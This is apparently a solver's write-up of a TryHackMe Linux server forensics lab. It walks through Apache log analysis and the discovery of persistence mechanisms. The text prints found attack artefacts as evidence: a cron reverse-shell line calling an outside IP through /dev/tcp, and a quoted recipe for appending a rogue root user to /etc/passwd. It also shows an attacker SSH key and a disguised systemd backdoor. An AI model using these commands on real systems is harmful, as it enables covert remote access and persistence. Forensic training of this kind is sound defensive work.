
https://tryhackme.com/r/room/linuxserverforensics

## Task 1 - Deploy the first VM

- 10.10.10.150
- Username - 'fred'
- Password - 'FredRules!'

## Task 2 Apache Log Analysis I
### Conectamos a la maquina
```
┌──(kali㉿kali)-[~/tryhackme/linuxserverforensics]
└─$ ssh fred@10.10.10.150    

Last login: Tue Apr 20 10:14:19 2021
fred@acmeweb:~$ _

```

### Navigate to /var/log/apache2


```
fred@acmeweb:~$ cd /var/log/apache2/
fred@acmeweb:/var/log/apache2$ ls
access.log  error.log  other_vhosts_access.log
fred@acmeweb:/var/log/apache2$ 

 ```

### How many different tools made requests to the server?

```
cat access.log | grep HTTP | grep -vi "Dirbuster"

DirBuster
Nmap


red@acmeweb:/var/log/apache2$ cat access.log | grep -i "get / "
192.168.1.119 - - [20/Apr/2021:09:14:06 +0000] "GET / HTTP/1.1" 200 1253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36"
192.168.56.8 - - [20/Apr/2021:09:23:02 +0000] "GET / HTTP/1.1" 200 1253 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.56.8 - - [20/Apr/2021:09:27:18 +0000] "GET / HTTP/1.1" 200 1253 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.0" 200 2495 "-" "-"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.0" 200 2495 "-" "-"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.0" 200 2495 "-" "-"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.1" 200 2476 "-" "-"
192.168.56.24 - - [20/Apr/2021:09:55:23 +0000] "GET / HTTP/1.1" 200 2476 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"



2
```

### Name a path requested by Nmap.

```
cat access.log | grep -i Nmap

192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /nmaplowercheck1618912425 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"](<cat access.log | grep -i Nmap | grep -i get
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /nmaplowercheck1618912425 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /.git/HEAD HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /robots.txt HTTP/1.1" 200 365 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /evox/about HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /HNAP1 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "GET /favicon.ico HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)">)


/nmaplowercheck1618912425

```


## Task 3 Web Server Analysis

### What page allows users to upload files?  

- Accedemos a la pagina desde al navegador
http://10.10.10.150/contact.php

contact.php

### What IP uploaded files to the server?

```
fred@acmeweb:/var/log/apache2$ grep POST access.log 
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST /sdk HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
Binary file access.log matches
fred@acmeweb:/var/log/apache2$ 

192.168.56.24 

```


### Who left an exposed security notice on the server?
#### Miramos el archivo de logs
```
red@acmeweb:/var/log/apache2$ cat access.log | grep -i sec
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /secret/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /secrets/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /section/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /sections/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /secure/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /security/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:30 +0000] "HEAD /secured/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /secret.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /secrets.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /section.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /sections.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /secure.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /secured.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:31 +0000] "HEAD /security.html HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "HEAD /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 233 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
192.168.56.24 - - [20/Apr/2021:09:55:34 +0000] "GET /resources/development/2021/docs/SECURITY.md HTTP/1.1" 200 507 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"

```
#### Vamos a la web
```
http://10.10.71.83/resources/development/2021/docs/SECURITY.md

we have to really got to sort out the contact page theres **NO** validation whatsoever.I can't belive we haven't been hacked yet - Fred.
we have to really got to sort out the contact page theres **NO** validation whatsoever.I can't belive we haven't been hacked yet - Fred.


Fred

```

## Task 4 Persistence Mechanisms I

```
red@acmeweb:/var/log/apache2$ crontab -l
no crontab for fred
fred@acmeweb:/var/log/apache2$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
fred@acmeweb:/var/log/apache2$ 



sh -i
```

## Task 5 User Accounts
#### Listamos las cuentas
```
fred@acmeweb:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
fred:x:1000:1000:fred:/home/fred:/bin/bash
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash

```
#### Googleamos el hash
```
Google: WVLY0mgH0RtUI

https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file

# to generate hash of the password
openssl passwd mrcake
hKLD3431415ZE

# to create a second root user with "mrcake" password
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

# to switch to a root2
su root2
Password: mrcake 


mrcake


```
## Task 6 Deploy the second VM

10.10.215.193
'fred'
FredRules!

```
                                                                                           
┌──(kali㉿kali)-[~]
└─$ ssh fred@10.10.215.193
The authenticity of host '10.10.215.193 (10.10.215.193)' can't be established.
ED25519 key fingerprint is SHA256:huSeFODhbiA0Oi1AyWqO6U7iluv8dBB3hSPKUDwJ7Rc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:44: [hashed name]
    ~/.ssh/known_hosts:46: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.215.193' (ED25519) to the list of known hosts.
fred@10.10.215.193's password: 

```


## Task 7 Apache Log Analysis II
#### Name one of the non-standard HTTP Requests.
```
fred@acmeweb:/var/log/apache2$ grep -a -v -i "get\|post" access.log 
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "\x16\x03" 400 0 "-" "-"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "GXWR / HTTP/1.1" 501 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"


GXWR

```

####  At what time was the Nmap scan performed? (format: HH:MM:SS)
```
13:30:15
```

## Task 8 Persistence Mechanisms II

#### What username and hostname combination can be found in one of the authorized_keys files? (format: username@hostname)

```
fred@acmeweb:~$ sudo -l
[sudo] password for fred: 
Matching Defaults entries for fred on acmeweb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on acmeweb:
    (ALL : ALL) ALL

fred@acmeweb:~$ sudo su
root@acmeweb:/home/fred# cd /root/.ssh/
root@acmeweb:~/.ssh# ls
authorized_keys
root@acmeweb:~/.ssh# cat authorized_keys 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYCKt0bYP2YIwMWdJWqF3lr3Drs3sS9hiybsxz9W6dG6d15mg0SVMSe5H+rPM6VmzOKJaVpDjT1Ll5eR6YcbefTF2bMXHveyvcrzDxyZeWdgBs5u8/4DZxEN6fq6IZRRftmrMgMzSnpmdCm8kvacgq3lIjLx/sKAlX9GqPIz09t0Rk5MB7zk3lg1wdTZxZwwCHPbZW7mGlVcxNBB9wdbAmcvezscoF0i7v0tY8iCoFlrBysOMBMrEJji2UONtI/wrt7AvoK+gshiG7VTjZ2oQBacnyHRToXHxOZiSIbCQrJ6rCxa32QOGQNmAVIucqYjRbJedz0NbGq7M9B+hBmG/mdtsoGOXQKyzoUlAbulRXjSVtManiUyq9im1HBHfuduiBrbfcOKz24NMT7RaIsPsZCUCpfHaT7S5XplQypAjkxABds8jod/TXcTYibdWE9scrUUidgCsPELQlKEfhhZ8+cyjbMCGNB5LOgieJSVk6D1JC97TaFNi4X9/9i2UA+L0= kali@kali
root@acmeweb:~/.ssh# 


root:root

```

## Task 9 Program Execution History

```
/var/log/auth.log
/var/log/apt/history.log


fred@acmeweb:~$ sudo su
root@acmeweb:/home/fred# cd /root
root@acmeweb:~# cat .bash_history 
nano /etc/passwd
exit
cd /root/.ssh/
ls
cat authorized_keys 
exit



nano /etc/passwd

```

## Task 10 Deploy The Final VM

```
    10.10.96.226
    fred
    FredRules!

ssh fred@10.10.96.226 
The authenticity of host '10.10.96.226 (10.10.96.226)' can't be established.
ED25519 key fingerprint is SHA256:huSeFODhbiA0Oi1AyWqO6U7iluv8dBB3hSPKUDwJ7Rc.
This host key is known by the following other names/addresses:

```

## Task 11 Persistence Mechanisms III

```

IpManager.service
   Loaded: loaded (/var/lib/network/IpManager.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2024-10-18 00:59:34 UTC; 2min 53s ago
 Main PID: 1422 (bash)
    Tasks: 2 (limit: 499)
   CGroup: /system.slice/IpManager.service
           ├─1422 /bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
           └─1627 sleep 10

sudo systemctl stop IpManager


cat /etc/network/ZGtsam5hZG1ua2Fu.sh
##[gh0st_1n_the_machine]
## 
declare -a error_messages


gh0st_1n_the_machine

```







